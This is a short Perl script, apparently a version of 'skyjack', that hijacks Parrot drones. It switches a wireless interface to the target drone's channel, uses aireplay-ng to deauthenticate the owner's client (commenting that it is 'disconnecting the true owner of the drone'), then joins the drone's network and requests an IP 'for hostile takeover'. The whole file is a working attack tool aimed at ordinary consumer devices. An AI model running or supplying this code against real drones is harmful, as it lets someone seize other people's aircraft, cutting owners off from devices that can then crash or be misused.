#!/usr/bin/perl

# skyjack, by samy kamkar

# this software detects flying drones, deauthenticates the
# owner of the targetted drone, then takes control of the drone

# by samy kamkar, code@samy.pl
# http://samy.pl
# dec 2, 2013


# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt

$num_args = $#ARGV + 1;
if ($num_args != 4) {
    print "\nUsage: hack.pl drone_id drone_mac drone_channel client_mac\n";
    exit;
}

my $drone_id = $ARGV[0];
my $drone_mac = $ARGV[1];
my $drone_channel = $ARGV[2];
my $client_mac = $ARGV[3];

# paths to applications
my $dhclient	= "dhclient";
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";

my %skyjacked;

#print "LABEL|CLIENT_MAC|DRONE_ID|DRONE_MAC|DRONE_CHANNEL\n";

#print "DATA|$cli|$chans{$clients{$cli}}[1]|$clients{$cli}|$drone_channel\n";


# hop onto the channel of the ap
print "Jumping onto drone's channel $drone_channel\n\n";
## sudo($airmon, "start", $interface, $drone_channel);
sudo($iwconfig, "wlan0mon", "channel", $drone_channel);

sleep(1);

# now, disconnect the TRUE owner of the drone.
print "Disconnecting the true owner of the drone ;)\n\n";
sudo($aireplay, "-0", "3", "-a", $drone_mac, "-c", $client_mac, "wlan0mon");
#sudo($aireplay, "-0", "3", "-a", $drone_mac, "wlan0mon");

# go into managed mode
#sudo($airmon, "stop", $interfaceMon);

print "\n\nConnecting to drone $drone_id ($drone_mac)\n";
sudo($iwconfig, "wlan1", "essid", $drone_id);

print "Acquiring IP from drone for hostile takeover\n";
sudo($dhclient, "-v", "wlan1");


sub sudo
{
	print "Running: @_\n";
	system("sudo", @_);
}